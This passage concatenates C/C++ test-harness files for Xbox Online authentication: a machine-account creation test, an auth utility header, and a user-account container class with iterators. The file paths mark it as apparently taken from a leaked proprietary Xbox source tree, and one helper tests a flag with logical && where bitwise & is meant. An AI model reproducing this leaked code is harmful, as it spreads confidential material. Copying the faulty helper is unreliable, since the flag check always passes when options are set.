/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_NoAccountHasInternet
 *
 *  Description:
 *		Create a machine account on an xbox that has no machine account 
 *		and is connected to the internet
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: FALSE
 *		Account valid: N/A
 *		Connected to internet: TRUE
 *
 *	Verify: 
 *		Return code is S_OK
 *		Valid account exists
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineCreateMachineAccount_NoAccountHasInternet( void )
{
    HRESULT             hr              = S_OK;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// Erase the machine acount
	//

	CHECKRUN( RemoveMachineAccount() );

	//
	// Create the machine Account
	//

	CHECKRUN( XOnlineCreateMachineAccount() );

	//
	// verify a machine account exists
	//

	CHECKRUNBOOL( XOnlineHasMachineAccount() );

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineCreateMachineAccount tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineCreateMachineAccount_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineCreateMachineAccount without an account, with net
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineCreateMachineAccount", "NoAccountHasInternet" );
    EXECUTE( XOnlineCreateMachineAccount_NoAccountHasInternet() );

	//
	// Test XOnlineCreateMachineAccount without an account, no net
	//

    SETLOG( LogHandle, "danrose", "Online", "XOnlineCreateMachineAccount", "NoAccountNoInternet" );
    EXECUTE( XOnlineCreateMachineAccount_NoAccountNoInternet() );

	//
	// Test XOnlineCreateMachineAccount with an account, no net
	//

    SETLOG( LogHandle, "danrose", "Online", "XOnlineCreateMachineAccount", "ValidAccountHasInternet" );
    EXECUTE( XOnlineCreateMachineAccount_ValidAccountHasInternet() );

	//
	// Test XOnlineCreateMachineAccount with a valid account, but no internet
	//

    SETLOG( LogHandle, "danrose", "Online", "XOnlineCreateMachineAccount", "ValidAccountNoInternet" );
    EXECUTE( XOnlineCreateMachineAccount_ValidAccountNoInternet() );

}

/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineCreateMachineAccount_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineCreateMachineAccount_StartTest( NULL );
    XOnlineCreateMachineAccount_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineCreateMachineAccount )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineCreateMachineAccount )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineCreateMachineAccount_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineCreateMachineAccount_EndTest )
END_EXPORT_TABLE( XOnlineCreateMachineAccount )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\XOnlineAuthUtil.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineAuthUtil.h
 *  Content:    utility functions
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/22/01    danrose Created to test Xbox Online Auth apis
 *  01/05/02    davidhef Added WaitForTask()
 *  01/05/02    davidhef Added IsUserDataEqual() and operators
 *
 ****************************************************************************/

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xonlinep.h>
#include <list>


//
// functions to start and close the network
//

HRESULT StartNetwork( void );
HRESULT CloseNetwork( void );

HRESULT DeleteAllUsersFromHD( void );

inline bool IsMUAccount(XONLINE_USER const *pUser)
{
    return (pUser->dwUserOptions && XONLINE_USER_OPTION_CAME_FROM_MU);
}

inline bool IsHDAccount(XONLINE_USER const *pUser)
{
    return !IsMUAccount(pUser);
}

DWORD CountMUAccounts(XONLINE_USER const *pUsers);

//
// Function that lets logon finish its initial work.
//

HRESULT WaitForLogon( XONLINETASK_HANDLE taskHandle, HANDLE hEvent );

// Compare user data
bool IsUserDataEqual(XONLINEP_USER const *pUser1, XONLINEP_USER const *pUser2);

// Useful operators
inline bool operator==( XUID const& lhs, XUID const& rhs )
{
    // Only compare the actual IDs, not the flags.
    return (lhs.qwUserID == rhs.qwUserID);
}

inline bool operator!=( XUID const& lhs, XUID const& rhs )
{
    return !(lhs == rhs);
}

inline bool operator==( XUID const& lhs, ULONGLONG rhs )
{
    // Only compare the actual IDs, not the flags.
    return (lhs.qwUserID == rhs);
}

inline bool operator!=( XUID const& lhs, ULONGLONG rhs )
{
    return !(lhs == rhs);
}

inline bool operator==(XONLINE_USER const& lhs, XONLINE_USER const& rhs)
{
    return (lhs.xuid == rhs.xuid);
}

inline bool operator!=(XONLINE_USER const& lhs, XONLINE_USER const& rhs)
{
    return !(lhs == rhs);
}

bool BVTMode( void );


class CXOnlineTaskManager
{
public:

    CXOnlineTaskManager(DWORD dwDefaultTickCount = 0);

    ~CXOnlineTaskManager();

    HRESULT ManageTask(XONLINETASK_HANDLE taskHandle, HANDLE hEvent);

private:

    CRITICAL_SECTION        m_critSec;
    DWORD                   m_defaultTicks;

    struct taskRec
    {
        struct taskRec() { ; }
        struct taskRec(XONLINETASK_HANDLE taskHandle, HANDLE hEvent, DWORD dwTicks)
            :   taskHandle(taskHandle),
                hEvent(hEvent),
                dwTicks(dwTicks)
        {
        }

        XONLINETASK_HANDLE  taskHandle;
        HANDLE              hEvent;
        DWORD               dwTicks;
    };

    typedef struct taskRec TaskRec;

    std::list<TaskRec>         m_taskList;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\cxliveusermanager.h ===
#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xonlinep.h>
#include <algorithm>
#include <functional>
#include <vector>
#include <exception>
#include <Assert.h>
#include <new>

#pragma once



namespace XLive
{


//
/////////////////////// Iterator base class /////////////////////////
//
class UserAccountIterator : public std::bidirectional_iterator_tag
{
    friend class CXLiveUserManager;
public:
    inline UserAccountIterator(UserAccountIterator const &rhs)
        : m_pUserMgr(rhs.m_pUserMgr), m_pUser(rhs.m_pUser)
    {
    }

    // Primary constructor
    inline explicit UserAccountIterator(CXLiveUserManager const * const pUserMgr, XONLINE_USER *pUser)
        :   m_pUserMgr(pUserMgr),
            m_pUser(pUser)
    {
    }

    inline explicit UserAccountIterator()     // For STL
        : m_pUserMgr(NULL), m_pUser(NULL)
    {
    }

    virtual inline ~UserAccountIterator() { ; }

    virtual inline UserAccountIterator& operator=(UserAccountIterator const &rhs)
    {
        new (this) UserAccountIterator(rhs);
        return *this;
    }

    inline XONLINE_USER& operator*() const  { return *m_pUser; }
    inline XONLINE_USER* operator->() const { return  m_pUser; }

    // Relational operators
    inline bool operator==(UserAccountIterator const &rhs) const  { return rhs.m_pUser == m_pUser; }
    inline bool operator!=(UserAccountIterator const &rhs) const  { return !(rhs == *this); }
    inline bool operator<(UserAccountIterator const &rhs)  const  { return m_pUser < rhs.m_pUser; }
    inline bool operator<=(UserAccountIterator const &rhs)  const  { return m_pUser <= rhs.m_pUser; }
    inline bool operator>(UserAccountIterator const &rhs)  const  { return m_pUser > rhs.m_pUser; }
    inline bool operator>=(UserAccountIterator const &rhs)  const  { return m_pUser >= rhs.m_pUser; }

protected:
    // Member variables.
    CXLiveUserManager const * const m_pUserMgr;
    XONLINE_USER                    *m_pUser;
};


//
////////////////////////////////////////////////////////////////
//

/////////////////////// Useful function objects ////////////////
//
class IsAccount:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return (user.xuid.qwUserID != 0);
    }
};

class IsMUAccount:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return ((user.dwUserOptions & XONLINE_USER_OPTION_CAME_FROM_MU) &&
            (user.xuid.qwUserID != 0));
    }
};

class IsHDAccount:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return (!(user.dwUserOptions & XONLINE_USER_OPTION_CAME_FROM_MU))
                    && (user.xuid.qwUserID != 0);
    }
};

class IsGuest:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return ((user.dwUserOptions & XONLINE_USER_GUEST_MASK) &&
            (user.xuid.qwUserID != 0));
    }
};

class UserAccountHasName:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return (user.name[0] != static_cast<CHAR>('\0'));
    }
};

class UserAccountHasXUID:
    public std::unary_function< XONLINE_USER const&, bool >
{
public:
    inline bool operator()(XONLINE_USER const& user) const
    {
        return (user.xuid.qwUserID != 0);
    }
};


//
////////////////////////////////////////////////////////////////////
//

class CXLiveUserManager
{
public:

    // Container type declarations
    typedef XONLINE_USER value_type;
    typedef size_t size_type;
    typedef size_t difference_type;
    typedef XONLINE_USER& reference;
    typedef XONLINE_USER const & const_reference;

    // Forward declarations
    class MUAccountIterator;
    class HDAccountIterator;
    class AccountIterator;
    class const_AccountIterator;

public:

    explicit CXLiveUserManager()
        :   m_pStart(&(m_users[0])),
            m_pEnd((&m_users[0]) + XONLINE_MAX_STORED_ONLINE_USERS - 1)
    {
        ZeroMemory(&(m_users[0]), sizeof(m_users));
        ZeroMemory(&m_selectedAccounts[0], sizeof(m_selectedAccounts));
        ComputeAccounts();
        ComputeMUAccounts();
        ComputeHDAccounts();
    }

    explicit CXLiveUserManager(XONLINE_USER const *users)
        :   m_pStart(m_users),
            m_pEnd((m_users + XONLINE_MAX_STORED_ONLINE_USERS - 1)),
            m_numberOfSelectedAccounts(0)
    {
        memcpy(m_users, users, sizeof(m_users));
        ZeroMemory(m_selectedAccounts, sizeof(m_selectedAccounts));
        ComputeAccounts();
        ComputeMUAccounts();
        ComputeHDAccounts();
    }

    ~CXLiveUserManager();

    //
    // Class operators ///////////////////////////////////////////////
    //

    bool operator==(CXLiveUserManager const &rhs) const
    {
        for (size_t i = 0; i < XONLINE_MAX_STORED_ONLINE_USERS; ++i)
        {
            if (memcmp(m_users + i, rhs.m_users + i, sizeof(XONLINE_USER)) != 0)
            {
                return false;
            }
        }
        return true;
    }

    inline bool operator!=(CXLiveUserManager const &rhs) const  { return !(*this == rhs); }

    inline XONLINE_USER& operator[]( int element ) const
    {
//       Assert(element >= 0 && element < XONLINE_MAX_STORED_ONLINE_USERS);
        return *(m_pStart + element);
    }

    //
    // Standard container support ////////////////////////////////////////
    //

    inline XONLINE_USER &front()                { return *m_pStart; }
    inline XONLINE_USER &back()                 { return *m_pEnd; }
    inline XONLINE_USER const& front() const    { return *m_pStart; }
    inline XONLINE_USER const& back()  const    { return *m_pEnd; }

    inline XONLINE_USER& at(size_type pos)
    {
//        Assert(pos >= 0 && pos < XONLINE_MAX_STORED_ONLINE_USERS);
        if (pos < 0 || pos >= XONLINE_MAX_STORED_ONLINE_USERS)
        {
            throw std::out_of_range("CXLiveUserManager: Invalid subscript!");
        }

        return *(m_pStart + pos);
    }

    inline XONLINE_USER const & at(size_type pos) const
    {
//        Assert(pos >= 0 && pos < XONLINE_MAX_STORED_ONLINE_USERS);
        if (pos < 0 || pos >= XONLINE_MAX_STORED_ONLINE_USERS)
        {
            throw std::out_of_range("CXLiveUserManager: Invalid subscript!");
        }

        return *(m_pStart + pos);
    }

    inline size_t size() const  { return std::count_if(m_pStart, m_pEnd, UserAccountHasXUID()); }
    inline bool empty() const   { return std::find_if( m_pStart, m_pEnd, UserAccountHasXUID()) == m_pEnd; }
    inline size_t max_size() const  { return m_pEnd - m_pStart; }
    inline size_t capacity() const  { return m_pEnd - m_pStart; }

    AccountIterator erase(AccountIterator it)
    {
//        Assert(it >= begin());
//        Assert(it <= end());

        if (it.m_pUser == m_pEnd)
        {
            return it;
        }

        ZeroMemory(it.m_pUser, sizeof(XONLINE_USER));

        // See if we need to recompute these pointers.
        if (IsMUAccount(it))
        {
            ComputeAccounts();
        }

        if (IsMUAccount(it))
        {
            ComputeMUAccounts();
        }

        if (IsHDAccount(it))
        {
            ComputeHDAccounts();
        }

        return AccountIterator(this, it.m_pUser + 1);
    }

    AccountIterator erase(AccountIterator first, AccountIterator last)
    {
//        Assert(last >= first);
//        Assert(last <= end());
//        Assert(first >= begin());

        size_t count = last.m_pUser - first.m_pUser;
        ZeroMemory(first.m_pUser, sizeof(XONLINE_USER) * count);

        ComputeAccounts();
        return (last == Account_end()) ? last : AccountIterator(this, last.m_pUser + 1);
    }

    MUAccountIterator erase(MUAccountIterator first, MUAccountIterator last)
    {
//        Assert(last >= first);
//        Assert(last <= end());
//        Assert(first >= begin());

        for (; first != last; ++first)
        {
            (void) erase(first);
        }

        ComputeMUAccounts();
        return (last == MUAccount_end()) ? last : ++last;
    }

    MUAccountIterator erase(MUAccountIterator it)
    {
        if (it == MUAccount_end())
        {
            return it;
        }

        ZeroMemory(it.m_pUser, sizeof(XONLINE_USER));
        ComputeMUAccounts();
        return ++it;
    }

    HDAccountIterator erase(HDAccountIterator it)
    {
        if (it == HDAccount_end())
        {
            return it;
        }

        ZeroMemory(it.m_pUser, sizeof(XONLINE_USER));
        ComputeHDAccounts();
        return ++it;
    }

    HDAccountIterator erase(HDAccountIterator first, HDAccountIterator last)
    {
//        Assert(last >= first);
//        Assert(last <= end());
//        Assert(first >= begin());

        for (; first != last; ++first)
        {
            (void) erase(first);
        }

        ComputeHDAccounts();
        return (last == HDAccount_end()) ? last : ++last;
    }

    inline void clear()
    {
        (void) erase(Account_begin(), Account_end());
        ComputeAccounts();
        ComputeMUAccounts();
        ComputeHDAccounts();
    }

    //
    // The following operator exposes the internal table for use
    // by XOnlineLogon() and other APIs.
    inline operator XONLINE_USER*() { return m_pStart; }

    bool VerifyNoDuplicates() const;

    HRESULT ClearAccountSelections()
    {
        ZeroMemory(&m_selectedAccounts[0], sizeof(m_selectedAccounts));
        m_numberOfSelectedAccounts = 0;
        return S_OK;
    }

    HRESULT SelectAccount(UserAccountIterator it)
    {
        if (m_numberOfSelectedAccounts < XONLINE_MAX_LOGON_USERS)
        {
            m_selectedAccounts[ m_numberOfSelectedAccounts++ ] = *it;
            return S_OK;
        }
        else
        {
            return E_INVALIDARG;
        }
    }

    inline XONLINE_USER *SelectedAccounts() { return &m_selectedAccounts[0]; }

    static HRESULT PopulateMUs(DWORD *pCount);

    HRESULT GenerateAndSelectRandomAccounts(    int hdMasterAccounts,
                                                int hdGuestAccounts,
                                                int muMasterAccounts,
                                                int muGuestAccounts);

    HRESULT GenerateAndSelectRandomAccounts()
    {
        return GenerateAndSelectRandomAccounts(1, 1, 1, 1);
    }

    bool UserIsSelected(const XUID puid) const
    {
        for (   const XONLINE_USER *pUser = m_selectedAccounts;
                pUser < m_selectedAccounts + XONLINE_MAX_LOGON_USERS;
                ++pUser)
        {
            if (pUser->xuid == puid)
            {
                return true;
            }
        }
        return false; 
    }


//
//////////////////////// Define iterator support
//

    inline static bool IsAccount(XONLINE_USER const *pUser)
    {
        XLive::IsAccount muTest;
        return muTest(*pUser);
    }

    inline static bool IsGuestAccount(XONLINE_USER const *pUser)
    {
        XLive::IsGuest muTest;
        return muTest(*pUser);
    }

    inline static bool IsMUAccount(XONLINE_USER const *pUser)
    {
        XLive::IsMUAccount muTest;
        return muTest(*pUser);
    }

    inline static bool IsHDAccount(XONLINE_USER const *pUser)
    {
        XLive::IsHDAccount muTest;
        return muTest(*pUser);
    }

    inline AccountIterator Account_begin()
    {
        if (m_pFirstAccount == NULL)
        {
            return AccountIterator(this, m_pEnd);
        }
        return AccountIterator(this, m_pFirstAccount);
    }

    inline AccountIterator Account_end()
    {
        if (m_pFirstAccount == NULL)
        {
            return AccountIterator(this, m_pEnd);
        }
        return AccountIterator(this, m_pLastAccount + 1);
    }

    inline const_AccountIterator Account_begin() const
    {
        if (m_pFirstAccount == NULL)
        {
            return const_AccountIterator(this, m_pEnd);
        }
        return const_AccountIterator(this, m_pFirstAccount);
    }

    inline const_AccountIterator Account_end() const
    {
        if (m_pFirstAccount == NULL)
        {
            return const_AccountIterator(this, m_pEnd);
        }
        return const_AccountIterator(this, m_pLastAccount + 1);
    }

    inline MUAccountIterator MUAccount_begin() const
    {
        if (m_pFirstMUAccount == NULL)
        {
            return MUAccountIterator(this, m_pEnd);
        }
        return MUAccountIterator(this, m_pFirstMUAccount);
    }

    inline MUAccountIterator MUAccount_end() const
    {
        if (m_pFirstMUAccount == NULL)
        {
            return MUAccountIterator(this, m_pEnd);
        }
        return MUAccountIterator(this, m_pLastMUAccount + 1);
    }

    inline HDAccountIterator HDAccount_begin() const
    {
        if (m_pFirstHDAccount == NULL)
        {
            return HDAccountIterator(this, m_pEnd);
        }
        return HDAccountIterator(this, m_pFirstHDAccount);
    }

    inline HDAccountIterator HDAccount_end() const
    {
        if (m_pFirstHDAccount == NULL)
        {
            return HDAccountIterator(this, m_pEnd);
        }
        return HDAccountIterator(this, m_pLastHDAccount + 1);
    }

    size_t CountAccounts()   const { return std::count_if(Account_begin(), Account_end(), XLive::IsAccount()); }
    size_t CountMUAccounts() const { return std::count_if(MUAccount_begin(), MUAccount_end(), XLive::IsMUAccount()); }
    size_t CountHDAccounts() const { return std::count_if(HDAccount_begin(), HDAccount_end(), XLive::IsHDAccount()); }

    HRESULT CreateAndSelectGuestAccount(const UserAccountIterator it, int guestNumber);
    HRESULT VerifyLogon(XONLINE_USER const *pLoggedUsers) const;

private:
    XONLINE_USER        m_users[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER* const m_pStart;
    XONLINE_USER* const m_pEnd;
    XONLINE_USER        *m_pFirstAccount;
    XONLINE_USER        *m_pLastAccount;
    XONLINE_USER        *m_pFirstMUAccount;
    XONLINE_USER        *m_pLastMUAccount;
    XONLINE_USER        *m_pFirstHDAccount;
    XONLINE_USER        *m_pLastHDAccount;

    XONLINE_USER        m_selectedAccounts[XONLINE_MAX_LOGON_USERS];
    size_t              m_numberOfSelectedAccounts;

    void ComputeAccounts(void);
    void ComputeMUAccounts(void);
    void ComputeHDAccounts(void);



//
/////////////////////// Nested classes
//
public:

    class AccountIterator : public UserAccountIterator
    {
        friend class CXLiveUserManager;

    public:

        inline ~AccountIterator() { ; }

        // Allow conversion to const_AccountIterator.
        inline operator const_AccountIterator() { return const_AccountIterator(m_pUserMgr, m_pUser); }

        // Allow conversion to const *.
        inline operator XONLINE_USER const *() const { return m_pUser; }

        // Allow conversion to *.
        inline operator XONLINE_USER*()         { return m_pUser; }

        // Prefix increment operator
        inline AccountIterator& operator++()
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
           //Assert(m_pUserMgr->IsAccount(m_pUser));
            m_pUser = std::find_if(m_pUser + 1, (m_pUserMgr->m_pLastAccount) + 1, XLive::IsAccount());
            return *this;
        }

        // Prefix decrement operator
        inline AccountIterator& operator--()
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
           //Assert(m_pUserMgr->IsAccount(m_pUser));
            do
            {
                --m_pUser;
            } while ((!m_pUserMgr->IsAccount(m_pUser)) && (m_pUser != m_pUserMgr->m_pFirstAccount));
            return *this;
        }

        // Postfix operators
        inline AccountIterator operator--(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
            AccountIterator saveIt(*this);
            --(*this);
            return saveIt;
        }

        inline AccountIterator operator++(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
            AccountIterator saveIt(*this);
            ++(*this);
            return saveIt;
        }

    private:
        // Primary constructor
        explicit AccountIterator(CXLiveUserManager const * const pUserMgr, XONLINE_USER *pUser)
            :   UserAccountIterator(pUserMgr, pUser)
        {
           //Assert(NULL != pUserMgr);
           //Assert(NULL != pUser);
        }
    };  // [nested] class AccountIterator


    class const_AccountIterator : public UserAccountIterator
    {
        // The following line allows conversion of AccountIterator to const_AccountIterator.
        friend class AccountIterator;

        friend class CXLiveUserManager;

    public:

        inline const_AccountIterator& operator=(const_AccountIterator const &rhs)
        {
           //Assert(&rhs != this);
            new (this) const_AccountIterator(rhs);
            return *this;
        }

        inline operator XONLINE_USER const *() const    { return m_pUser; }

        inline XONLINE_USER const & operator*() const  { return *m_pUser; }
        inline XONLINE_USER const * operator->() const { return  m_pUser; }

        // Prefix increment operator
        inline const_AccountIterator& operator++()
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
            ++m_pUser;
            return *this;
        }

        // Prefix decrement operator
        inline const_AccountIterator& operator--()
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
            --m_pUser;
            return *this;
        }

        // Postfix operators
        inline const_AccountIterator operator--(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
            const_AccountIterator saveIt(*this);
            --(*this);
            return saveIt;
        }

        inline const_AccountIterator operator++(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
            const_AccountIterator saveIt(*this);
            ++(*this);
            return saveIt;
        }

    private:
        // Primary constructor
        explicit const_AccountIterator(CXLiveUserManager const * const pUserMgr, XONLINE_USER *pUser)
            :   UserAccountIterator(pUserMgr, pUser)
        {
           //Assert(NULL != pUserMgr);
           //Assert(NULL != pUser);
        }
    };  // [nested] class const_AccountIterator


    class MUAccountIterator : public UserAccountIterator
    {
        friend class CXLiveUserManager;
    public:
        inline ~MUAccountIterator() { ; }

        // Relational operators
        inline bool operator==(MUAccountIterator const &rhs) const  { return rhs.m_pUser == m_pUser; }
        inline bool operator!=(MUAccountIterator const &rhs) const  { return !(rhs == *this); }
        inline bool operator<(MUAccountIterator const &rhs)  const  { return m_pUser < rhs.m_pUser; }   // For STL

        // Prefix increment operator
        inline MUAccountIterator& operator++()
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
           //Assert(m_pUserMgr->IsMUAccount(m_pUser));
            m_pUser = std::find_if(m_pUser + 1, (m_pUserMgr->m_pLastMUAccount) + 1, XLive::IsMUAccount());
            return *this;
        }

        // Prefix decrement operator
        inline MUAccountIterator& operator--()
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
           //Assert(m_pUserMgr->IsMUAccount(m_pUser));
            do
            {
                --m_pUser;
            } while ((!m_pUserMgr->IsMUAccount(m_pUser)) && (m_pUser != m_pUserMgr->m_pFirstMUAccount));
            return *this;
        }

        // Postfix operators
        inline MUAccountIterator operator--(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
            MUAccountIterator saveIt(*this);
            --(*this);
            return saveIt;
        }

        inline MUAccountIterator operator++(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
            MUAccountIterator saveIt(*this);
            ++(*this);
            return saveIt;
        }

    private:
        // Primary constructor
        inline explicit MUAccountIterator(CXLiveUserManager const * const pUserMgr, XONLINE_USER *pUser)
            :   UserAccountIterator(pUserMgr, pUser)
        {
           //Assert(NULL != pUserMgr);
           //Assert(NULL != pUser);
        }
    };  // [nested] class MUAccountIterator


    class HDAccountIterator : public UserAccountIterator
    {
        friend class CXLiveUserManager;

    public:

        inline ~HDAccountIterator() { ; }

        // Relational operators
        inline bool operator==(HDAccountIterator const &rhs) const  { return rhs.m_pUser == m_pUser; }
        inline bool operator!=(HDAccountIterator const &rhs) const  { return !(rhs == *this); }
        inline bool operator<( HDAccountIterator const &rhs) const  { return m_pUser < rhs.m_pUser; }   // For STL

        // Prefix increment operator
        inline HDAccountIterator& operator++()
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
           //Assert(m_pUserMgr->IsHDAccount(m_pUser));
            m_pUser = std::find_if(m_pUser + 1, (m_pUserMgr->m_pLastHDAccount) + 1, XLive::IsHDAccount());
            return *this;
        }

        // Prefix decrement operator
        inline HDAccountIterator& operator--()
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
           //Assert(m_pUserMgr->IsHDAccount(m_pUser));
            do
            {
                --m_pUser;
            } while ((!m_pUserMgr->IsHDAccount(m_pUser)) && (m_pUser != m_pUserMgr->m_pFirstHDAccount));
            return *this;
        }

        // Postfix operators
        inline HDAccountIterator operator--(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pStart);
            HDAccountIterator saveIt(*this);
            --(*this);
            return saveIt;
        }

        inline HDAccountIterator operator++(int)
        {
           //Assert(m_pUser != m_pUserMgr->m_pEnd);
            HDAccountIterator saveIt(*this);
            ++(*this);
            return saveIt;
        }

    private:
        // Primary constructor
        inline explicit HDAccountIterator(CXLiveUserManager const * const pUserMgr, XONLINE_USER *pUser)
            :   UserAccountIterator(pUserMgr, pUser)
        {
           //Assert(NULL != pUserMgr);
           //Assert(NULL != pUser);
        }
    };  // [nested] class HDAccountIterator

//
///////////////////////
//

};











} // namespace XLive
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\cxliveusermanager.cpp ===
#include <XOnlineAuthUtil.h>
#include <CXLiveUserManager.h>
#include <CXLiveConnectionManager.h>
#include <OnlineAccounts.h>

using namespace std;

using XLive::CXLiveConnectionManager;

namespace XLive
{



CXLiveUserManager::~CXLiveUserManager()
{
}



//
//////////// Private functions /////////////
//


void CXLiveUserManager::ComputeAccounts(void)
{
    // Compute and store the location of the first account.
    m_pFirstAccount = find_if(m_pStart, m_pEnd, XLive::IsAccount());

    // Compute and store the location of the last account.
    if (m_pFirstAccount == m_pEnd)
    {
        m_pLastAccount = m_pFirstAccount = NULL;
        return;
    }

    XONLINE_USER *pCurrent = m_pFirstAccount;
    for (; pCurrent != m_pEnd; ++pCurrent)
    {
        if (IsAccount(pCurrent))
        {
            m_pLastAccount = pCurrent;
        }
    }
}

void CXLiveUserManager::ComputeMUAccounts(void)
{
    // Compute and store the location of the first MU account.
    m_pFirstMUAccount = find_if(m_pStart, m_pEnd, XLive::IsMUAccount());

    // Compute and store the location of the last MU account.
    if (m_pFirstMUAccount == m_pEnd)
    {
        m_pLastMUAccount = m_pFirstMUAccount = NULL;
        return;
    }

    XONLINE_USER *pCurrent = m_pFirstMUAccount;
    for (; pCurrent != m_pEnd; ++pCurrent)
    {
        if (IsMUAccount(pCurrent))
        {
            m_pLastMUAccount = pCurrent;
        }
    }
}

void CXLiveUserManager::ComputeHDAccounts(void)
{
    // Compute and store the location of the first HD account.
    m_pFirstHDAccount = find_if(m_pStart, m_pEnd, XLive::IsHDAccount());

    // Compute and store the location of the last HD account.
    if (m_pFirstHDAccount == m_pEnd)
    {
        m_pLastHDAccount = m_pFirstHDAccount = NULL;
        return;
    }

    XONLINE_USER *pCurrent = m_pFirstHDAccount;
    for (; pCurrent != m_pEnd; ++pCurrent)
    {
        if (IsHDAccount(pCurrent))
        {
            m_pLastHDAccount = pCurrent;
        }
    }
}

bool CXLiveUserManager::VerifyNoDuplicates() const
{
    const_AccountIterator it = Account_begin();
    const_AccountIterator end1 = Account_end();
    --end1;
    for (; it != end1; ++it)
    {
        const_AccountIterator it2 = it;
        for (++it2; it2 != Account_end(); ++it2)
        {
            if (*it == *it2)
            {
                // Found a duplicate.
                return false;
            }
        }
    }
    return true;
}

HRESULT CXLiveUserManager::PopulateMUs(DWORD *pCount)
{
    ASSERT(NULL != pCount);

    HRESULT hr = S_OK;
    static char chDrives[ 8 ] = {
        'F', 'G', 'H', 'I',
        'J', 'K', 'L', 'M'
    };
    *pCount = 0;    // Don't depend on the caller to init.
    XONLINEP_USER user;
    XONLINEP_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    
    static DWORD dwServices[] = {
            XONLINE_USER_ACCOUNT_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);
    
    // zero out the users
    ZeroMemory( aIniUsers, sizeof( aIniUsers ) );
    
    // Note: The test harness has already mounted the MUs.
    // This means that we cannot mount them here.

    // Make sure that there is at least one MU.
    DWORD dwMUs = XGetDevices(XDEVICE_TYPE_MEMORY_UNIT);
    Sleep(1000);       // Wait for all MUs to enumerate.
    dwMUs = XGetDevices(XDEVICE_TYPE_MEMORY_UNIT);

    if (dwMUs > 0)
    {
        // Logon with 0 users just to create a connection.
        CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(dwServices, cServices));
        CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection((PXONLINE_USER) aIniUsers));

        // Try to put an account in every mounted MU.
        for (size_t i = 0; i < sizeof(chDrives) / sizeof(char) && SUCCEEDED(hr); ++i)
        {
            // Cause a random name, kingdom, etc. to be generated.
            ZeroMemory(&user, sizeof(user));
            
            // Add a user to this MU.
            // This call will fail if this MU does not exist.  We accept this
            // type of failure.
            hr = COnlineAccounts::Instance()->PopulateUserAccountsMU(chDrives[ i ], &user);
